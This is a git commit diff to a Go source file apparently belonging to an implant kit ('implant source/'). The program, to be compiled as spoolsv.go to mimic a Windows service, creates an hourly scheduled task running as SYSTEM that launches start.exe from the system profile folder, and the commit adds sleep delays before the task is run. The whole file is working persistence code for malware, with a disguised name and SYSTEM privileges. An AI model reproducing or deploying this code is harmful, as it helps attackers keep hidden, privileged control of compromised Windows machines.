4166c8b5ede0a99ebaff3682c4ebf6ec4b89812d
Piotr Marszalik <addenial@users.noreply.github.com>
2020-07-01 07:00:57 -0400

    Update TEMPLATE6-schtasknocleanup.go

--- implant source/TEMPLATE6-schtasknocleanup.go
+++ implant source/TEMPLATE6-schtasknocleanup.go
@@ -1,16 +1,28 @@
 package main
 import(
 	"os/exec"
+	"time"
+	"fmt"
 )
 
 //Compile with: env GOOS=windows GOARCH=386 go build spoolsv.go
 
 func main(){
 
+	//adding delays because networking is not ready yet when this executes. 
+	//a := exec.Command("ping", "-n" , "7", "127.0.0.1")
+	//a.Start()
+	fmt.Printf("Time Unix: %v\n", time.Now().Unix())
+	time.Sleep(7 * time.Second)
+	fmt.Printf("Time now %v\n", time.Now().Unix())
+	
 	c := exec.Command("schtasks", "/create", "/ru", "SYSTEM", "/tn","start", "/tr","c:\\Windows\\System32\\config\\systemprofile\\AppData\\Roaming\\start.exe", "/sc","hourly", "/f")
-	d := exec.Command("schtasks", "/run", "/tn","start")
- 
 	c.Start()
-	d.Start()
 
+        fmt.Printf("Time Unix: %v\n", time.Now().Unix())
+        time.Sleep(5 * time.Second)
+        fmt.Printf("Time now %v\n", time.Now().Unix())
+
+	d := exec.Command("schtasks", "/run", "/tn","start")
+	d.Start()
 }       
